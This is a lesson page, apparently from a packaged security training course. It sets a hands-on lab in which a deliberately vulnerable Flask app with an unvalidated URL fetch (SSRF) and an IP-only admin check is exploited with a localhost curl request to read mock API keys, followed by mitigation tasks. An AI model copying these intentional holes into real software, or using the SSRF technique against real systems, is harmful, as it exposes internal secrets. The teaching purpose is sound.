<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
<head>
    <title>4.5 Hands-on Exercise: Advanced Security Analysis</title>
    <style type="text/css" media="screen">
		@import url( ../shared/style.css );
	</style>
	<script src="../shared/scormfunctions.js" type="text/javascript"></script>
	<script src="../shared/contentfunctions.js" type="text/javascript"></script>
</head>
<body>
<h1>4.5 Hands-on Exercise: Advanced Security Analysis</h1>

<p>In this final exercise for Level 4, you will apply the concepts you've learned to identify and exploit a combined vulnerability scenario involving SSRF and Insecure Design.</p>

<h2>Scenario: The "Internal Report Generator"</h2>
<p>You have discovered an internal application used by the marketing team to generate reports from various data sources. The application has two main endpoints:</p>
<ol>
    <li><code>/api/report/generate</code>: Takes a <code>source_url</code> parameter, fetches data from that URL, and generates a PDF report.</li>
    <li><code>/api/admin/config</code>: An internal-only endpoint (supposedly restricted to localhost) that returns the application's configuration, including internal API keys.</li>
</ol>

<h2>Goal</h2>
<p>Your goal is to use the SSRF vulnerability in the report generator to access the internal configuration endpoint and steal the API keys.</p>

<h3>Step 1: Deploy the Vulnerable App</h3>
<p>Save the following code as <code>advanced_vulnerable_app.py</code> and run it using Python:</p>
<pre>
from flask import Flask, request, jsonify, abort
import requests

app = Flask(__name__)

# Mock database of API keys
INTERNAL_CONFIG = {
    "database_password": "super_secret_password_123",
    "cloud_api_key": "AIzaSyB-EXAMPLE-KEY-98765",
    "admin_email": "admin@internal-corp.com"
}

@app.route('/api/report/generate')
def generate_report():
    source_url = request.args.get('source_url')
    if not source_url:
        return "Missing source_url", 400

    # SSRF VULNERABILITY: No validation on source_url
    try:
        response = requests.get(source_url, timeout=5)
        # Mocking PDF generation from fetched data
        return f"Report generated based on data from {source_url}. Data preview: {response.text[:100]}"
    except Exception as e:
        return str(e), 500

@app.route('/api/admin/config')
def get_config():
    # INSECURE DESIGN: Relying on IP check for "internal only" access
    if request.remote_addr != '127.0.0.1':
        abort(403, description="Forbidden: Internal access only")

    return jsonify(INTERNAL_CONFIG)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)
</pre>

<h3>Step 2: Exploit the SSRF</h3>
<p>Open a new terminal and use <code>curl</code> to make the server request its own internal admin endpoint:</p>
<pre>
curl "http://localhost:5001/api/report/generate?source_url=http://127.0.0.1:5001/api/admin/config"
</pre>

<h3>Step 3: Analyze the Output</h3>
<p>If successful, the output should contain the JSON data from the configuration endpoint, even though you cannot access <code>/api/admin/config</code> directly from your browser if you were on a different machine.</p>

<h2>Challenge: Mitigation</h2>
<ol>
    <li>Modify the <code>generate_report</code> function to implement a whitelist of allowed domains.</li>
    <li>Change the <code>get_config</code> function to use a more robust authentication mechanism (e.g., a shared secret or JWT) instead of just checking the remote IP address.</li>
    <li>Add logging to both endpoints to track successful and failed attempts.</li>
</ol>

<p>This exercise demonstrates how multiple vulnerabilities can be "chained" together to achieve a greater impact than either one could alone.</p>

<script type="text/javascript">
</script>
</body>
</html>
